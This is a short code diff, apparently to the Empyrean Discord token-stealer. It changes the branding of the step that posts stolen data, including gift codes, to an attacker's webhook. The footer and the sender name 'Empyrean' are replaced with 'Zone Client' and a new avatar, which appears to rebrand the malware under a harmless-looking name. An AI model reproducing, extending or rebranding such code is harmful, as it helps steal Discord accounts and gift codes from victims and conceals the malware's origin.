@@ -391,7 +391,7 @@ class upload_tokens:
                     name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="yessir")
 
-            self.webhook.send(embed=embed, username="Empyrean",
-                              avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Zone Client",
+                              avatar_url="https://imgur.com/a/HLImJ5l")
